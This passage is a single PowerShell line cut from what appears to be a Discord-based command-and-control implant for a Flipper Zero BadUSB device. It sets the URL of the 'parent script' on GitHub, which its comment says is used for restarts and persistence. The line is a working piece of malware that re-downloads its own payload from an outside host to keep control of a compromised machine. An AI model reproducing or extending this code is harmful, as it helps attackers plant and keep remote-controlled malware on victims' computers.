...
$parent = "https://raw.githubusercontent.com/Eltechno2/Posh-CordC2/refs/heads/main/BadUSB/DCC2-FlipperZero.txt" # parent script URL (for restarts and persistance)
